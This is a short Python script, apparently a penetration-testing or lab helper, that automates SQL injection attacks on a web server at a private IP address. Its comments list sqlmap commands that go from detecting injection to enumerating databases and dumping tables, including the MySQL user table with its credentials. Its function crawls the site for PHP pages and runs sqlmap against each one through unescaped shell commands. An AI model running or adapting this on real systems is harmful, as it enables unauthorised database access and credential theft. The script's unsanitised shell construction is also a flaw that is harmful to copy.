__author__ = 'mannea'
import os
import os.path
import sys
import datetime
import time
import threading
import xml.etree.ElementTree as ET

#
#  Check for vulnerable
#  sqlmap -u "http://192.168.1.120/products.php?id=1 "
#  sqlmap -u "http://192.168.1.120/products.php?id=1 " --dbs
#  sqlmap -u "http://192.168.1.120/products.php?id=1 " --tables [DATABASE]
#  sqlmap -u "http://192.168.1.120/products.php?id=1 " --dump -D [DATABASE] -T [TABLE]
#  sqlmap -u "http://192.168.1.120/products.php?id=1 " --dump -D mysql -T user

# wget --spider -r --no-parent http://192.168.1.120/


# wget --spider --force-html -r -l1 http://192.168.1.120 2>&1 | grep 'Saving to:' | awk '{ print $3 }' | awk '{print substr($0, 0, length($0)-1)}' | awk '{print substr($1,2); }' > wget_enum
# wget --spider --force-html -r -l1 http://192.168.1.120 2>&1 | grep 'Saving to:' | awk '{ print $3 }' | awk '{print substr($0, 0, length($0)-0)}' | awk '{print substr($1,2); }' > wget

# /usr/share/sqlmap/output/[ip]/dump/[database]/[table].csv

def enum_php(address, path):
    output_file = str(path) + "wget_tmp_enum"
    cmd = "wget --spider --force-html -r -l1 http://%s 2>&1 | grep 'Saving to:' | awk '{ print $3 }' | awk '{print substr($0, 0, length($0)-0)}' | awk '{print substr($1,2); }' | grep php > %s" % (
        address, output_file
    )
    os.system(cmd)

    lines = [line.strip() for line in open(output_file)]
    for l in lines:
        cmd = 'sqlmap -u "http://%s/%s?id=1 " >> %sphp_enum' % (address, l, path)
        os.system(cmd)